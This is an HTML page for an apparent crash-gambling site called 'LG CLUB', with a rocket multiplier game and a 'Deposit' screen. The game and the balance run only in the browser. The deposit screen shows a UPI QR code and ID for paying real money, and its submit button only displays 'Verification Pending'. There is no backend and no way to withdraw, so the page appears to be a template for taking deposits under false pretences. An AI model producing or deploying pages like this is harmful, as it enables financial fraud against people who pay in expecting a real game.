<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LG CLUB | IE777 Style</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
    <style>
        :root { --gold: #ffdf8e; --bg: #0b0505; --card: #1f0d0d; --green: #28a745; --red: #ff4444; }
        body { background: var(--bg); color: #fff; font-family: sans-serif; margin: 0; overflow-x: hidden; }
        
        /* Header */
        .header { background: #350a0a; padding: 15px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid var(--gold); position: sticky; top: 0; z-index: 100; }
        .balance-badge { background: rgba(0,0,0,0.5); padding: 5px 15px; border-radius: 20px; border: 1px solid var(--gold); color: var(--gold); font-weight: bold; }

        /* Round History */
        .history-bar { display: flex; gap: 8px; overflow-x: auto; padding: 10px; background: #1a0a0a; border-bottom: 1px solid #333; }
        .hist-item { background: #331a1a; padding: 2px 10px; border-radius: 10px; font-size: 12px; color: var(--gold); border: 0.5px solid #555; }

        /* GoRush Crash Engine */
        .game-container { padding: 15px; text-align: center; }
        .crash-board { background: radial-gradient(circle, #410a0a 0%, #000 100%); height: 250px; border-radius: 15px; position: relative; overflow: hidden; border: 1px solid #4d1a1a; display: flex; align-items: center; justify-content: center; }
        #multiplier { font-size: 60px; font-weight: 900; color: var(--gold); z-index: 10; transition: 0.1s; }
        .rocket-svg { position: absolute; bottom: 20px; left: 20px; width: 50px; transition: 0.1s linear; }

        /* Control Panel */
        .controls { background: var(--card); padding: 20px; border-radius: 20px; margin: 15px; border: 1px solid #3d1a1a; }
        .bet-input { width: 100%; padding: 15px; background: #000; border: 1px solid #5a2d2d; color: var(--gold); border-radius: 10px; font-size: 20px; text-align: center; margin-bottom: 15px; }
        .btn-bet { width: 100%; padding: 18px; border-radius: 12px; border: none; font-weight: bold; font-size: 18px; background: linear-gradient(180deg, #ffdf8e, #c69433); color: #000; cursor: pointer; }
        .btn-cashout { background: var(--green) !important; color: #fff !important; }

        /* Navigation */
        .nav-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; padding: 15px; }
        .nav-item { background: var(--card); border-radius: 10px; padding: 10px; text-align: center; border: 1px solid #333; font-size: 11px; }
        .nav-item img { width: 100%; border-radius: 5px; margin-bottom: 5px; }

        .hidden { display: none; }
    </style>
</head>
<body>

    <div class="header">
        <div style="font-weight:bold; color: var(--gold); font-size: 20px;">LG CLUB</div>
        <div class="balance-badge">₹<span id="user-balance">10.00</span></div>
        <button onclick="openDeposit()" style="background: var(--green); border:none; color:#fff; padding: 5px 12px; border-radius: 5px; font-weight: bold;">Deposit</button>
    </div>

    <div class="history-bar" id="history-list">
        <div class="hist-item">1.50x</div>
        <div class="hist-item" style="color: #9c27b0;">15.30x</div>
        <div class="hist-item">2.46x</div>
    </div>

    <div id="game-view">
        <div class="game-container">
            <div class="crash-board">
                <div id="status-tag" style="position: absolute; top: 10px; color: #888; font-size: 12px;">NEXT ROUND IN 3s</div>
                <div id="multiplier">1.00x</div>
                <img id="rocket-img" class="rocket-svg" src="https://img.icons8.com/external-flatart-icons-flat-flatarticons/64/000000/external-rocket-space-flatart-icons-flat-flatarticons.png" style="filter: invert(1);">
            </div>

            <div class="controls">
                <input type="number" id="bet-amt" class="bet-input" value="10">
                <button id="bet-btn" class="btn-bet" onclick="handleBet()">BET</button>
            </div>
        </div>

        <div style="padding: 0 15px; font-size: 13px; color: #888;">TURBO GAMES</div>
        <div class="nav-grid">
            <div class="nav-item"><img src="https://i.imgur.com/B7yM7yM.jpg"><br>Turbo Mines</div>
            <div class="nav-item"><img src="https://i.imgur.com/pYvV8vV.jpg"><br>Aviator</div>
            <div class="nav-item"><img src="https://i.imgur.com/yourpoker.jpg"><br>Dice Twice</div>
        </div>
    </div>

    <div id="deposit-modal" class="hidden" style="position:fixed; top:0; background:var(--bg); width:100%; height:100%; z-index:200; padding:20px; text-align:center;">
        <button onclick="closeDeposit()" style="float:left; background:none; border:none; color:#fff; font-size:25px;">⬅️</button>
        <h2 style="color:var(--gold);">Add Money</h2>
        <div id="qrcode" style="background:#fff; padding:10px; width:180px; margin:20px auto; border-radius:10px;"></div>
        <p>UPI: <b>7470807k@nyes</b></p>
        <input type="number" id="utr" class="bet-input" placeholder="Enter UTR Number">
        <button class="btn-bet" onclick="alert('Verification Pending')">SUBMIT</button>
    </div>

<script>
    let bal = 10.0;
    let multi = 1.0;
    let isRunning = false;
    let betPlaced = false;
    let interval;

    function handleBet() {
        let btn = document.getElementById('bet-btn');
        let amt = parseFloat(document.getElementById('bet-amt').value);

        if(!isRunning && !betPlaced) {
            if(amt > bal) return alert("Balance kam hai!");
            bal -= amt;
            updateUI();
            betPlaced = true;
            btn.innerText = "WAITING...";
            btn.style.opacity = "0.6";
        } else if(isRunning && betPlaced) {
            // Cashout
            let win = amt * multi;
            bal += win;
            betPlaced = false;
            btn.innerText = "CASHED OUT!";
            btn.classList.add('btn-cashout');
            updateUI();
            setTimeout(() => { btn.classList.remove('btn-cashout'); btn.innerText = "BET"; }, 2000);
        }
    }

    function startEngine() {
        let crashPoint = (Math.random() * 5 + 1.1).toFixed(2);
        multi = 1.0;
        isRunning = true;
        document.getElementById('status-tag').innerText = "LIVE";
        let btn = document.getElementById('bet-btn');
        if(betPlaced) { btn.innerText = "CASH OUT"; btn.style.opacity = "1"; }

        interval = setInterval(() => {
            multi += 0.01;
            document.getElementById('multiplier').innerText = multi.toFixed(2) + "x";
            
            // Rocket Move
            let r = document.getElementById('rocket-img');
            r.style.left = (20 + (multi-1)*20) + "px";
            r.style.bottom = (20 + (multi-1)*30) + "px";

            if(multi >= crashPoint) {
                clearInterval(interval);
                isRunning = false;
                document.getElementById('multiplier').style.color = "red";
                document.getElementById('status-tag').innerText = "CRASHED @ " + crashPoint + "x";
                
                // Add History
                let h = document.getElementById('history-list');
                h.innerHTML = `<div class="hist-item">${crashPoint}x</div>` + h.innerHTML;

                if(betPlaced) { btn.innerText = "LOST!"; betPlaced = false; }

                setTimeout(() => {
                    document.getElementById('multiplier').innerText = "1.00x";
                    document.getElementById('multiplier').style.color = "var(--gold)";
                    r.style.left = "20px"; r.style.bottom = "20px";
                    btn.innerText = "BET";
                    document.getElementById('status-tag').innerText = "NEXT ROUND IN 3s";
                    setTimeout(startEngine, 3000);
                }, 3000);
            }
        }, 80);
    }

    function updateUI() { document.getElementById('user-balance').innerText = bal.toFixed(2); }
    function openDeposit() { 
        document.getElementById('deposit-modal').classList.remove('hidden'); 
        document.getElementById('qrcode').innerHTML = "";
        new QRCode(document.getElementById("qrcode"), { text: "upi://pay?pa=7470807k@nyes&pn=LGCLUB&am=100&cu=INR", width: 180, height: 180 });
    }
    function closeDeposit() { document.getElementById('deposit-modal').classList.add('hidden'); }

    setTimeout(startEngine, 3000);
</script>
</body>
    </html>
